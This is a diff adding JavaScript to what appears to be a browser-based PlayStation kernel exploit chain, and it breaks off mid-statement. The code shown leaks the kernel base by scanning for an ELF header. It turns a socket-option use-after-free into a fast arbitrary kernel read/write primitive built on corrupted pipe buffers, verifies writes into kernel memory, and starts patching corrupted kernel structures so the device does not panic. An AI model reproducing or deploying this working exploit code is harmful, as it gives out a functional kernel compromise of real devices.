@@ -2112,4 +2112,813 @@ function makeRpc(worker) {
                     check("read-primitive-survives-write", kstr2 === "evf cv",
                         "'" + kstr2 + "' after " + kwriteCalls + " pktinfo writes");
                     check("ip6po_pktinfo-not-left-interior",
-              
+                    check("ip6po_pktinfo-not-left-interior",
+                        kstr2 === "evf cv",
+                        "a dangling interior pointer here is a free() of a "
+                        + "non-allocation at teardown -- that is what panicked "
+                        + "the last run");
+
+                    if (wroteOk && kstr2 === "evf cv")
+                        mark("KERNEL-RW", "read=ok write=ok via=pktopts "
+                            + "aim=verified selfref=restored");
+                }
+
+                state("stage 6: locating the kernel base...", "warn");
+                const KSTR_RESIDUE = evfCv.low & 0x3fff;
+                const KSTR_LO = params.has("kstrlo")
+                    ? parseInt(params.get("kstrlo"), 16) : 0x780000;
+                const KSTR_HI = params.has("kstrhi")
+                    ? parseInt(params.get("kstrhi"), 16) : 0x800000;
+                const ELF_MAGIC = 0x464c457f;
+
+                mark("KSTR-PLAN", "residue=0x" + KSTR_RESIDUE.toString(16)
+                    + " window=0x" + KSTR_LO.toString(16) + "..0x"
+                    + KSTR_HI.toString(16) + " step=0x4000 order=ascending");
+                if (KSTR_RESIDUE !== 0x26f)
+                    mark("KSTR-RESIDUE-ODD", "expected 0x26f from the earlier "
+                        + "runs but this one gives 0x" + KSTR_RESIDUE.toString(16)
+                        + " -- the constraint may not hold, treat the result "
+                        + "with suspicion");
+
+                let first = KSTR_LO;
+                while ((first & 0x3fff) !== KSTR_RESIDUE) first++;
+                let kstrOff = -1, kbase = null, tried = 0, lastRead = null;
+                for (let off = first; off <= KSTR_HI; off += 0x4000) {
+                    const cand = evfCv.sub32(off);
+                    const w = kread8(cand);
+                    tried++;
+                    lastRead = w;
+                    if (!w) break;
+                    if ((w.low >>> 0) === ELF_MAGIC) {
+                        kstrOff = off; kbase = cand; break;
+                    }
+                }
+                mark("KSTR-SCAN", tried + " candidate(s) tested, last read "
+                    + (lastRead || "null")
+                    + (kstrOff >= 0 ? "" : " -- no ELF header found"));
+
+                if (kstrOff >= 0) {
+
+                    const hdr = kread8(kbase.add32(0x10));
+                    const eType = hdr ? (hdr.low & 0xffff) : -1;
+                    const eMachine = hdr ? ((hdr.low >>> 16) & 0xffff) : -1;
+                    const ident = kread8(kbase);
+                    const eiClass = ident ? (ident.hi & 0xff) : -1;
+                    mark("KERNEL-BASE", kbase + "   e_type=" + eType
+                        + " e_machine=0x" + eMachine.toString(16)
+                        + " ei_class=" + eiClass);
+                    const hdrOk = (eType === 2 || eType === 3) && eMachine === 0x3e
+                        && eiClass === 2;
+                    check("elf-header-base-checks", hdrOk,
+                        "want e_type 2 or 3, e_machine 0x3e, ei_class 2");
+                    if (hdrOk) {
+                        mark("OFF-KSTR", "0x" + kstrOff.toString(16)
+                            + "   (evf_cv " + evfCv + " - kernel base " + kbase
+                            + ")   residue 0x" + (kstrOff & 0x3fff).toString(16));
+                        mark("OFF-KSTR-COMPARE", "known: 6.00 0x7da91c, 7.xx "
+                            + "0x7f92cb, 8.xx 0x79a92e, 9.xx 0x7edcff, PSFree "
+                            + "0x7f6f27 -- this one is 0x" + kstrOff.toString(16));
+                        check("off_kstr for " + key + " recovered", true,
+                            "0x" + kstrOff.toString(16)
+                            + (off.k_evf_cv !== undefined
+                                ? (kstrOff === off.k_evf_cv
+                                    ? "   matches the table"
+                                    : "   TABLE SAYS 0x" + off.k_evf_cv.toString(16))
+                                : "   (no table value to compare)"));
+                    }
+                } else {
+                    check("off_kstr for " + key + " recovered", false,
+                        "no ELF header in the window -- either it is not mapped "
+                        + "or off_kstr is outside 0x" + KSTR_LO.toString(16)
+                        + "..0x" + KSTR_HI.toString(16)
+                        + ". Widen with ?kstrlo=&kstrhi= only after deciding "
+                        + "the overshoot is acceptable.");
+                }
+
+                if (pipeM && pipeS) {
+
+                    let slowMs = 0, slowOk = 0;
+                    {
+                        const t0 = Date.now();
+                        for (let i = 0; i < 32; ++i) if (kread8(evfCv)) slowOk++;
+                        slowMs = Date.now() - t0;
+                    }
+                    const slowBps = Math.round(slowOk * 8 * 1000 / Math.max(1, slowMs));
+                    mark("SLOW-READ-BENCH", slowOk + "/32 eight-byte reads via "
+                        + "setsockopt+getsockopt in " + slowMs + " ms = "
+                        + slowBps + " bytes/s");
+
+                    let preflightOk = false;
+                    {
+                        const pat = alloc(0x18), got = alloc(0x18);
+                        for (let i = 0; i < 0x18; ++i) pat.u8[i] = 0xa0 + i;
+                        got.u8.fill(0);
+                        const w = sc(SYS.write, masterPipe[1], pat.addr, 0x18).i32;
+                        const midCnt = kread8(pipeM);
+                        const r = sc(SYS.read, masterPipe[0], got.addr, 0x18).i32;
+                        const endCnt = kread8(pipeM);
+                        const endOut = kread8(pipeM.add32(8));
+                        let same = w === 0x18 && r === 0x18;
+                        for (let i = 0; same && i < 0x18; ++i)
+                            same = got.u8[i] === pat.u8[i];
+                        const reset = !!endCnt && endCnt.low === 0 && endCnt.hi === 0
+                            && !!endOut && endOut.low === 0;
+                        mark("PIPE-PREFLIGHT", "write=" + w + " read=" + r
+                            + "  bytes identical=" + same
+                            + "  pipebuf mid cnt|in=" + (midCnt || "?")
+                            + "  end cnt|in=" + (endCnt || "?")
+                            + "  end out|size=" + (endOut || "?"));
+                        preflightOk = same && reset;
+                        check("0x18-write-read-round-trips-master"
+                            + "and leaves cnt/in/out at zero", preflightOk,
+                            preflightOk ? "so flush() is repeatable"
+                                : "flush() would walk forward through the buffer "
+                                + "-- refusing to aim the pipebuf");
+                    }
+
+                    if (preflightOk) try {
+
+                            const PIPEBUF_OUT = 8;
+                            const PIPE_PAGE = 0x4000;
+                            const PIPEBUF_SIZEOF = 0x18;
+                            const outAddr = pipeM.add32(PIPEBUF_OUT);
+                            const beforeOut = kread8(outAddr);
+
+                            const aimRc = pktinfoSet(function (dv) {
+                                put(dv, 0, outAddr);
+                                put(dv, 8, new int64(0, 0));
+                            });
+                            const seenOut = pktinfoGet();
+                            const aimOk = aimRc === 0 && seenOut && beforeOut
+                                && seenOut.low === beforeOut.low
+                                && seenOut.hi === beforeOut.hi;
+                            mark("FASTRW-AIM", "ip6po_pktinfo -> " + outAddr
+                                + "; through it reads " + (seenOut || "null")
+                                + ", kread8 said " + (beforeOut || "?"));
+                            check("pipebuf-aim-confirmed-before-writing",
+                                aimOk, aimOk ? "" : "NOT writing");
+
+                            if (aimOk) {
+
+                                const wRc = pktinfoSet(function (dv) {
+                                    dv.setUint32(0, 0, true);
+                                    dv.setUint32(4, PIPE_PAGE, true);
+                                    put(dv, 8, pipeS);
+                                });
+                                mark("FASTRW-WRITE", "master pipebuf <- out=0 size=0x"
+                                    + PIPE_PAGE.toString(16) + " buffer=" + pipeS
+                                    + " (setsockopt=" + wRc + ")");
+
+                            pktinfo.u8.fill(0);
+                            optLen.dv.setInt32(0, 0x14, true);
+                            sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
+                                IPV6_PKTINFO, pktinfo.addr, optLen.addr);
+                            const gotSize = pktinfo.dv.getUint32(4, true);
+                            const gotBuf = new int64(pktinfo.dv.getUint32(8, true),
+                                                     pktinfo.dv.getUint32(12, true));
+                            mark("FASTRW-READBACK", "pipebuf out="
+                                + pktinfo.dv.getUint32(0, true) + " size=0x"
+                                + gotSize.toString(16) + " buffer=" + gotBuf
+                                + "   want buffer=" + pipeS);
+                            const shaped = gotSize === PIPE_PAGE
+                                && gotBuf.low === pipeS.low && gotBuf.hi === pipeS.hi;
+                            check("master-pipe-buffer-points-slave",
+                                shaped, "");
+
+                            if (shaped) {
+
+                                for (let i = openFds.length - 1; i >= 0; --i)
+                                    if (openFds[i] === masterPipe[0]
+                                        || openFds[i] === masterPipe[1]
+                                        || openFds[i] === slavePipe[0]
+                                        || openFds[i] === slavePipe[1])
+                                        openFds.splice(i, 1);
+                                mark("PIPES-PINNED", "master " + masterPipe
+                                    + " and slave " + slavePipe + " taken off "
+                                    + "the cleanup list -- closing master would "
+                                    + "kmem_free slave's struct pipe");
+
+                                state("building KernelView...", "warn");
+
+                                function toI64(v) {
+                                    return (typeof v === "number")
+                                        ? new int64(v >>> 0, v < 0 ? 0xffffffff : 0)
+                                        : v;
+                                }
+
+                                class KernelView {
+                                    constructor(masterPipeFds, slavePipeFds) {
+                                        if (!Array.isArray(masterPipeFds)
+                                            || masterPipeFds.length !== 2)
+                                            throw new Error("pipe should have 2 fds for r/w");
+                                        if (!Array.isArray(slavePipeFds)
+                                            || slavePipeFds.length !== 2)
+                                            throw new Error("pipe should have 2 fds for r/w");
+
+                                        this.view = alloc(8);
+                                        this.masterPipe = masterPipeFds.slice();
+                                        this.slavePipe = slavePipeFds.slice();
+
+                                        const fds = [this.masterPipe[0], this.masterPipe[1],
+                                                     this.slavePipe[0], this.slavePipe[1]];
+                                        for (let i = 0; i < fds.length; ++i)
+                                            if (sc(SYS.fcntl, fds[i], F_SETFL,
+                                                   O_NONBLOCK).i32 === -1)
+                                                throw new Error("Unable to fcntl fd " + fds[i]);
+
+                                        this.pipeBuf = alloc(PIPEBUF_SIZEOF);
+                                        this.pipeBuf.u8.fill(0);
+                                        this.pipeBuf.dv.setUint32(0x0c, PIPE_PAGE, true);
+                                        this.flushes = 0;
+                                        this.bytesRead = 0;
+                                        this.bytesWritten = 0;
+                                    }
+
+                                    free() {  }
+
+                                    get dvBacking() { return this.view.addr; }
+
+                                    get pipeBacking() {
+                                        return new int64(this.pipeBuf.dv.getUint32(0x10, true),
+                                                         this.pipeBuf.dv.getUint32(0x14, true));
+                                    }
+
+                                    set pipeBacking(addr) {
+                                        if (addr.low === 0 && addr.hi === 0)
+                                            throw new Error("Empty addr !!");
+                                        put(this.pipeBuf.dv, 0x10, addr);
+                                    }
+
+                                    get pipeCount() {
+                                        return this.pipeBuf.dv.getUint32(0, true);
+                                    }
+
+                                    set pipeCount(count) {
+                                        if (count < 0 || count > 0xffffffff)
+                                            throw new RangeError("count " + count
+                                                + " out of range !!");
+                                        this.pipeBuf.dv.setUint32(0, count >>> 0, true);
+                                    }
+
+                                    flush() {
+                                        this.flushes++;
+                                        if (sc(SYS.write, this.masterPipe[1],
+                                               this.pipeBuf.addr, PIPEBUF_SIZEOF).i32 === -1)
+                                            throw new Error("Unable to write to fd "
+                                                + this.masterPipe[1] + " !!");
+                                        if (sc(SYS.read, this.masterPipe[0],
+                                               this.pipeBuf.addr, PIPEBUF_SIZEOF).i32 === -1)
+                                            throw new Error("Unable to read from fd "
+                                                + this.masterPipe[0] + " !!");
+                                    }
+
+                                    kread(dst, src, size) {
+                                        this.pipeBacking = src;
+                                        this.pipeCount = size;
+                                        this.flush();
+
+                                        const n = sc(SYS.read, this.slavePipe[0],
+                                                     dst, size).i32;
+                                        if (n === -1)
+                                            throw new Error("Unable to read from fd "
+                                                + this.slavePipe[0] + " !!");
+                                        this.bytesRead += n;
+                                        return n;
+                                    }
+
+                                    kwrite(dst, src, size) {
+                                        this.pipeBacking = dst;
+                                        this.pipeCount = size;
+                                        this.flush();
+
+                                        const n = sc(SYS.write, this.slavePipe[1],
+                                                     src, size).i32;
+                                        if (n === -1)
+                                            throw new Error("Unable to write to fd "
+                                                + this.slavePipe[1] + " !!");
+                                        this.bytesWritten += n;
+                                        return n;
+                                    }
+
+                                    getFloat32(byteOffset, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.kread(this.dvBacking,
+                                                   this.pipeBacking.add32(byteOffset), 4);
+                                        return this.view.dv.getFloat32(0, littleEndian);
+                                    }
+
+                                    getFloat64(byteOffset, littleEndian = false) {
+                                        this.kread(this.dvBacking,
+                                                   this.pipeBacking.add32(byteOffset), 8);
+                                        return this.view.dv.getFloat64(0, littleEndian);
+                                    }
+
+                                    getInt8(byteOffset) {
+                                        this.view.u8.fill(0);
+                                        this.kread(this.dvBacking,
+                                                   this.pipeBacking.add32(byteOffset), 1);
+                                        return this.view.dv.getInt8(0);
+                                    }
+
+                                    getInt16(byteOffset, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.kread(this.dvBacking,
+                                                   this.pipeBacking.add32(byteOffset), 2);
+                                        return this.view.dv.getInt16(0, littleEndian);
+                                    }
+
+                                    getInt32(byteOffset, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.kread(this.dvBacking,
+                                                   this.pipeBacking.add32(byteOffset), 4);
+                                        return this.view.dv.getInt32(0, littleEndian);
+                                    }
+
+                                    getUint8(byteOffset) {
+                                        this.view.u8.fill(0);
+                                        this.kread(this.dvBacking,
+                                                   this.pipeBacking.add32(byteOffset), 1);
+                                        return this.view.dv.getUint8(0);
+                                    }
+
+                                    getUint16(byteOffset, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.kread(this.dvBacking,
+                                                   this.pipeBacking.add32(byteOffset), 2);
+                                        return this.view.dv.getUint16(0, littleEndian);
+                                    }
+
+                                    getUint32(byteOffset, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.kread(this.dvBacking,
+                                                   this.pipeBacking.add32(byteOffset), 4);
+                                        return this.view.dv.getUint32(0, littleEndian);
+                                    }
+
+                                    getBInt(byteOffset, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.kread(this.dvBacking,
+                                                   this.pipeBacking.add32(byteOffset), 8);
+                                        return littleEndian
+                                            ? new int64(this.view.dv.getUint32(0, true),
+                                                        this.view.dv.getUint32(4, true))
+                                            : new int64(this.view.dv.getUint32(4, false),
+                                                        this.view.dv.getUint32(0, false));
+                                    }
+
+                                    setFloat32(byteOffset, value, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.view.dv.setFloat32(0, value, littleEndian);
+                                        this.kwrite(this.pipeBacking.add32(byteOffset),
+                                                    this.dvBacking, 4);
+                                    }
+
+                                    setFloat64(byteOffset, value, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.view.dv.setFloat64(0, value, littleEndian);
+                                        this.kwrite(this.pipeBacking.add32(byteOffset),
+                                                    this.dvBacking, 8);
+                                    }
+
+                                    setInt8(byteOffset, value) {
+                                        this.view.u8.fill(0);
+                                        this.view.dv.setInt8(0, value);
+                                        this.kwrite(this.pipeBacking.add32(byteOffset),
+                                                    this.dvBacking, 1);
+                                    }
+
+                                    setInt16(byteOffset, value, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.view.dv.setInt16(0, value, littleEndian);
+                                        this.kwrite(this.pipeBacking.add32(byteOffset),
+                                                    this.dvBacking, 2);
+                                    }
+
+                                    setInt32(byteOffset, value, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.view.dv.setInt32(0, value, littleEndian);
+                                        this.kwrite(this.pipeBacking.add32(byteOffset),
+                                                    this.dvBacking, 4);
+                                    }
+
+                                    setUint8(byteOffset, value) {
+                                        this.view.u8.fill(0);
+                                        this.view.dv.setUint8(0, value);
+                                        this.kwrite(this.pipeBacking.add32(byteOffset),
+                                                    this.dvBacking, 1);
+                                    }
+
+                                    setUint16(byteOffset, value, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.view.dv.setUint16(0, value, littleEndian);
+                                        this.kwrite(this.pipeBacking.add32(byteOffset),
+                                                    this.dvBacking, 2);
+                                    }
+
+                                    setUint32(byteOffset, value, littleEndian = false) {
+                                        this.view.u8.fill(0);
+                                        this.view.dv.setUint32(0, value >>> 0, littleEndian);
+                                        this.kwrite(this.pipeBacking.add32(byteOffset),
+                                                    this.dvBacking, 4);
+                                    }
+
+                                    setBInt(byteOffset, value, littleEndian = false) {
+                                        const v = toI64(value);
+                                        this.view.u8.fill(0);
+                                        if (littleEndian) {
+                                            this.view.dv.setUint32(0, v.low >>> 0, true);
+                                            this.view.dv.setUint32(4, v.hi >>> 0, true);
+                                        } else {
+                                            this.view.dv.setUint32(0, v.hi >>> 0, false);
+                                            this.view.dv.setUint32(4, v.low >>> 0, false);
+                                        }
+                                        this.kwrite(this.pipeBacking.add32(byteOffset),
+                                                    this.dvBacking, 8);
+                                    }
+                                }
+
+                                function kview(addr) {
+                                    kv.pipeBacking = addr;
+                                    return kv;
+                                }
+
+                                const FILEDESCENT_SIZE_KV = 8;
+                                function fget(fd) {
+                                    return kview(kFdtOfiles)
+                                        .getBInt(fd * FILEDESCENT_SIZE_KV, true);
+                                }
+
+                                kv = new KernelView(masterPipe, slavePipe);
+                                mark("KERNELVIEW", "built on master "
+                                    + masterPipe + " / slave " + slavePipe
+                                    + ", pipebuf scratch at " + kv.pipeBuf.addr
+                                    + ", 8-byte view at " + kv.dvBacking);
+
+                                const kvCv = kview(evfCv).getBInt(0, true);
+                                let kvStr = "";
+                                for (let i = 0; i < 8; ++i) {
+                                    const c = kv.view.dv.getUint8(i);
+                                    if (!c) break;
+                                    kvStr += String.fromCharCode(c);
+                                }
+                                mark("KV-READ", evfCv + " -> " + kvCv
+                                    + "  as text: '" + kvStr + "'");
+                                check("kernelview-reads-kernel-memory-evf",
+                                    kvStr === "evf cv", "got '" + kvStr + "'");
+
+                                const fpM = fget(masterPipe[0]);
+                                const fpS = fget(slavePipe[0]);
+                                const dM = kview(fpM).getBInt(0, true);
+                                const dS = kview(fpS).getBInt(0, true);
+                                mark("KV-FGET", "master fp " + fpM + " (kread8 said "
+                                    + pipeMFp + "), f_data " + dM
+                                    + " (kread8 said " + pipeM + ")");
+                                mark("KV-FGET", "slave  fp " + fpS + " (kread8 said "
+                                    + pipeSFp + "), f_data " + dS
+                                    + " (kread8 said " + pipeS + ")");
+                                check("pipes-ofiles-entries-match"
+                                    + "socket option read",
+                                    sameI64(fpM, pipeMFp) && sameI64(fpS, pipeSFp)
+                                    && sameI64(dM, pipeM) && sameI64(dS, pipeS),
+                                    "two independent primitives, same four "
+                                    + "kernel pointers");
+
+                                const mCnt = kview(pipeM).getUint32(0, true);
+                                const mIn = kview(pipeM).getUint32(4, true);
+                                const mOut = kview(pipeM).getUint32(8, true);
+                                const mSize = kview(pipeM).getUint32(0x0c, true);
+                                const mBuf = kview(pipeM).getBInt(0x10, true);
+                                mark("KV-PIPEBUF", "master cnt=" + mCnt + " in=" + mIn
+                                    + " out=" + mOut + " size=0x" + mSize.toString(16)
+                                    + " buffer=" + mBuf);
+                                check("master-pipebuf-aimed-slave"
+                                    + "struct pipe",
+                                    mSize === PIPE_PAGE && sameI64(mBuf, pipeS),
+                                    "want size=0x" + PIPE_PAGE.toString(16)
+                                    + " buffer=" + pipeS);
+                                check("master-pipe-drained-between-flushes",
+                                    mCnt === 0 && mIn === 0 && mOut === 0,
+                                    "cnt=" + mCnt + " in=" + mIn + " out=" + mOut
+                                    + " -- anything else and flush() is walking "
+                                    + "forward, which the pre-flight said it "
+                                    + "does not");
+
+                                if (kbase) {
+                                    const ELF_N = 0x100;
+                                    const ehdr = alloc(ELF_N);
+                                    ehdr.u8.fill(0);
+                                    const gotN = kv.kread(ehdr.addr, kbase, ELF_N);
+                                    const magic = ehdr.dv.getUint32(0, true) >>> 0;
+                                    const eiClass = ehdr.dv.getUint8(4);
+                                    const eType = ehdr.dv.getUint16(0x10, true);
+                                    const eMachine = ehdr.dv.getUint16(0x12, true);
+                                    const eEntry = new int64(ehdr.dv.getUint32(0x18, true),
+                                                             ehdr.dv.getUint32(0x1c, true));
+                                    mark("KV-BULK", gotN + "/" + ELF_N
+                                        + " bytes from " + kbase + " in ONE read(2): "
+                                        + hexBytes(ehdr.u8.subarray(0, 16)));
+                                    mark("KV-ELF", "magic=" + hx(magic)
+                                        + " ei_class=" + eiClass + " e_type=" + eType
+                                        + " e_machine=" + hx(eMachine)
+                                        + " e_entry=" + eEntry);
+                                    check("read2-pulled-whole-kernel-elf"
+                                        + "header out of kernel memory",
+                                        gotN === ELF_N && magic === ELF_MAGIC
+                                        && eiClass === 2 && eMachine === 0x3e
+                                        && (eType === 2 || eType === 3),
+                                        "read " + gotN + " bytes, magic " + hx(magic));
+                                } else {
+                                    mark("KV-BULK-SKIPPED", "stage 6 found no "
+                                        + "kernel base, so there is no address "
+                                        + "known to have 0x100 mapped bytes");
+                                }
+
+                                const tcAddr = reqs1Aligned.add32(PKTOPTS_TCLASS);
+                                function tclassGet() {
+                                    tcBuf.u8.fill(0);
+                                    tcLen.dv.setInt32(0, 4, true);
+                                    const r = sc(SYS.getsockopt, pktoptsTwins[0],
+                                        IPPROTO_IPV6, IPV6_TCLASS,
+                                        tcBuf.addr, tcLen.addr).i32;
+                                    return r === 0 ? (tcBuf.dv.getUint32(0, true) >>> 0)
+                                                   : -1;
+                                }
+                                const tcSock0 = tclassGet();
+                                const tcKv0 = kview(tcAddr).getUint32(0, true) >>> 0;
+                                mark("KV-TCLASS", "socket says " + hx(tcSock0)
+                                    + ", kv says " + hx(tcKv0) + " at " + tcAddr);
+                                check("kv-getsockoptipv6_tclass-read"
+                                    + "same kernel word", tcSock0 !== -1
+                                    && tcSock0 === tcKv0,
+                                    tcSock0 === -1 ? "getsockopt failed, so this "
+                                        + "witness is unavailable" : "");
+
+                                const KV_WITNESS = 0x4b565701;
+                                kview(tcAddr).setUint32(0, KV_WITNESS, true);
+                                const tcSock1 = tclassGet();
+                                const tcKv1 = kview(tcAddr).getUint32(0, true) >>> 0;
+                                mark("KV-WRITE", "wrote " + hx(KV_WITNESS)
+                                    + " at " + tcAddr + "; socket now says "
+                                    + hx(tcSock1) + ", kv says " + hx(tcKv1));
+                                check("kernel-word-written-through-pipes"
+                                    + "read back by the KERNEL, not by us",
+                                    tcSock1 === KV_WITNESS,
+                                    "getsockopt(IPV6_TCLASS) returned "
+                                    + hx(tcSock1) + " -- this is the proof that "
+                                    + "the write reached real kernel memory");
+                                check("kv-reads-write", tcKv1 === KV_WITNESS,
+                                    hx(tcKv1));
+
+                                if (tcSock0 !== -1) {
+                                    kview(tcAddr).setUint32(0, tcSock0, true);
+                                    const tcSock2 = tclassGet();
+                                    check("witness-field-restored",
+                                        tcSock2 === tcSock0,
+                                        hx(tcSock2) + " want " + hx(tcSock0));
+                                }
+
+                                const scratch = reqs1Aligned.add32(8);
+                                const magic64 = new int64(0x4b565701, 0xc0de4e01);
+                                kview(scratch).setBInt(0, magic64, true);
+                                const back64 = kview(scratch).getBInt(0, true);
+                                mark("KV-RW64", "wrote " + magic64 + " at " + scratch
+                                    + ", read " + back64);
+                                check("8-byte-kernel-round-trip-through",
+                                    sameI64(back64, magic64), back64.toString());
+                                kview(scratch).setBInt(0, 0, true);
+
+                                let fastMs = 0;
+                                {
+                                    const t0 = Date.now();
+                                    for (let i = 0; i < 32; ++i)
+                                        kview(evfCv).getBInt(0, true);
+                                    fastMs = Date.now() - t0;
+                                }
+                                let pageMs = 0, pageN = 0;
+                                if (kbase) {
+                                    const big = alloc(0x1000);
+                                    const t0 = Date.now();
+                                    for (let i = 0; i < 8; ++i)
+                                        pageN += kv.kread(big.addr, kbase, 0x1000);
+                                    pageMs = Date.now() - t0;
+                                }
+                                const fastBps = Math.round(32 * 8 * 1000
+                                    / Math.max(1, fastMs));
+                                mark("KV-BENCH", "32 eight-byte reads in " + fastMs
+                                    + " ms = " + fastBps + " bytes/s   (socket "
+                                    + "options managed " + slowBps + " bytes/s)");
+                                if (pageN)
+                                    mark("KV-BENCH-BULK", pageN + " bytes in "
+                                        + pageMs + " ms = "
+                                        + Math.round(pageN * 1000 / Math.max(1, pageMs))
+                                        + " bytes/s in 0x1000-byte reads");
+                                mark("KV-STATS", kv.flushes + " flushes, "
+                                    + kv.bytesRead + " bytes read, "
+                                    + kv.bytesWritten + " bytes written");
+
+                                const kvLive = kvStr === "evf cv"
+                                    && tcSock1 === KV_WITNESS;
+                                if (kvLive)
+                                    mark("KERNELVIEW-LIVE", "kv is the primitive "
+                                        + "now. ip6po_pktinfo is not needed again "
+                                        + "-- which is exactly what makes the "
+                                        + "repair below possible: every write it "
+                                        + "needs goes through the pipes.");
+
+                                if (!kvLive) {
+                                    mark("REPAIR-SKIPPED", "kv did not prove out, "
+                                        + "so stage 7 has no write primitive it "
+                                        + "can trust. Nothing is repaired and "
+                                        + "nothing is closed.");
+                                } else {
+
+                                state("stage 7: repairing the aliases...", "warn");
+
+                                const PKTOPTS_M = 0x00;
+                                const PKTOPTS_RTHDR = 0x68;
+                                const FILE_F_COUNT = 0x28;
+
+                                function fhold(fp) {
+                                    const before = kview(fp).getInt32(FILE_F_COUNT, true);
+                                    let after = before;
+                                    for (let bump = 1; bump <= 4; ++bump) {
+                                        kview(fp).setInt32(FILE_F_COUNT,
+                                            before + bump, true);
+                                        after = kview(fp).getInt32(FILE_F_COUNT, true);
+                                        if (after > before && after >= 2) break;
+                                    }
+                                    return { before: before, after: after };
+                                }
+
+                                function getIn6pOutputopts(fd) {
+                                    const fp = fget(fd);
+                                    if (!kptr(fp)) return null;
+                                    const fData = kview(fp).getBInt(0, true);
+                                    if (!kptr(fData)) return null;
+                                    const soPcb = kview(fData).getBInt(0x18, true);
+                                    if (!kptr(soPcb)) return null;
+                                    const o = kview(soPcb).getBInt(0x118, true);
+                                    return kptr(o) ? o : null;
+                                }
+
+                                const optsA = getIn6pOutputopts(pktoptsTwins[0]);
+                                const optsB = getIn6pOutputopts(pktoptsTwins[1]);
+                                const fdC = twinSocks.length ? twinSocks[0] : -1;
+                                const optsC = fdC > 0 ? getIn6pOutputopts(fdC) : null;
+                                const pktinfoA = optsA
+                                    ? kview(optsA).getBInt(PKTOPTS_PKTINFO, true) : null;
+                                const rthdrB = optsB
+                                    ? kview(optsB).getBInt(PKTOPTS_RTHDR, true) : null;
+                                const rthdrC = optsC
+                                    ? kview(optsC).getBInt(PKTOPTS_RTHDR, true) : null;
+
+                                mark("REPAIR-WALK", "fd " + pktoptsTwins[0]
+                                    + " in6p_outputopts=" + (optsA || "null")
+                                    + "   want " + reqs1Aligned);
+                                mark("REPAIR-WALK", "fd " + pktoptsTwins[1]
+                                    + " ip6po_rthdr=" + (rthdrB || "null")
+                                    + "   want " + reqs1Aligned);
+                                mark("REPAIR-WALK", "fd " + fdC
+                                    + " ip6po_rthdr=" + (rthdrC || "null")
+                                    + "   want " + reqs2Addr);
+                                mark("REPAIR-WALK", "fd " + pktoptsTwins[0]
+                                    + " ip6po_pktinfo=" + (pktinfoA || "null")
+                                    + "   want " + pipeM.add32(8)
+                                    + " (master's pipebuf.out)");
+
+                                const walkA = !!optsA && sameI64(optsA, reqs1Aligned);
+                                const walkB = !!rthdrB && sameI64(rthdrB, reqs1Aligned);
+                                const walkC = !!rthdrC && sameI64(rthdrC, reqs2Addr);
+                                const walkP = !!pktinfoA && sameI64(pktinfoA, pipeM.add32(8));
+                                check("socket-walk-lands-chunk-stage"
+                                    + "leaked, from both owners", walkA && walkB,
+                                    walkA && walkB ? "in6p_outputopts and the twin's "
+                                        + "ip6po_rthdr are the same allocation, and it "
+                                        + "is the one the aio_entry named"
+                                        : "walkA=" + walkA + " walkB=" + walkB);
+                                check("0x80-chunk-second-owner-where"
+                                    + "said it is", walkC,
+                                    walkC ? "" : "twinSocks[0]=" + fdC
+                                        + " rthdr=" + (rthdrC || "null"));
+                                check("ip6po_pktinfo-points-master-pipebuf",
+                                    walkP, walkP ? "" : "so this is not the pktopts "
+                                        + "the pipe primitive was built on");
+
+                                kview(reqs1Aligned).setBInt(8, 0, true);
+
+                                const chunkX = alloc(0x100);
+                                chunkX.u8.fill(0);
+                                const auditN = kv.kread(chunkX.addr, reqs1Aligned, 0x100);
+                                const dirtyWords = [];
+                                for (let o = 8; o < 0x100; o += 8) {
+                                    if (o === PKTOPTS_PKTINFO) continue;
+                                    if (o === PKTOPTS_TCLASS) continue;
+                                    const lo = chunkX.dv.getUint32(o, true) >>> 0;
+                                    const hi = chunkX.dv.getUint32(o + 4, true) >>> 0;
+                                    if (lo || hi) dirtyWords.push("+0x" + o.toString(16)
+                                        + "=" + new int64(lo, hi));
+                                }
+                                mark("REPAIR-AUDIT", auditN + " bytes of the aliased "
+                                    + "pktopts read back; head "
+                                    + hexBytes(chunkX.u8.subarray(0, 16))
+                                    + "   tclass=" + hx(chunkX.dv.getUint32(PKTOPTS_TCLASS, true))
+                                    + "   non-zero elsewhere: "
+                                    + (dirtyWords.length ? dirtyWords.join(" ") : "none"));
+                                const auditOk = auditN === 0x100 && dirtyWords.length === 0;
+                                check("nothing-ip6_clearpktopts-will-free"
+                                    + "chunk is a pointer", auditOk,
+                                    auditOk ? "every word zero except the rthdr header, "
+                                        + "ip6po_pktinfo and ip6po_tclass"
+                                        : "a non-zero word here becomes a free() of "
+                                        + "whatever it points at");
+
+                                const canRepair = walkA && walkB && walkC && walkP
+                                    && auditOk;
+                                if (!canRepair) {
+                                    mark("REPAIR-REFUSED", "the repair was NOT "
+                                        + "attempted. Nothing was written and nothing "
+                                        + "will be closed -- an unverified repair is "
+                                        + "worse than none, because it turns a known "
+                                        + "reboot into an unknown one.");
+                                } else {
+
+                                    const pipeFds = [masterPipe[0], masterPipe[1],
+                                                     slavePipe[0], slavePipe[1]];
+                                    const expectFp = [pipeMFp, null, pipeSFp, null];
+                                    let held = 0;
+                                    const holdLog = [];
+                                    for (let i = 0; i < pipeFds.length; ++i) {
+                                        const fp = fget(pipeFds[i]);
+                                        if (!kptr(fp)) {
+                                            holdLog.push(pipeFds[i] + ":fp=" + fp);
+                                            continue;
+                                        }
+                                        if (expectFp[i] && !sameI64(fp, expectFp[i])) {
+                                            holdLog.push(pipeFds[i] + ":fp=" + fp
+                                                + " != " + expectFp[i]);
+                                            continue;
+                                        }
+                                        const probe = kview(fp).getInt32(FILE_F_COUNT, true);
+                                        if (!(probe >= 1 && probe <= 16)) {
+                                            holdLog.push(pipeFds[i] + ":f_count=" + probe
+                                                + " implausible");
+                                            continue;
+                                        }
+                                        const h = fhold(fp);
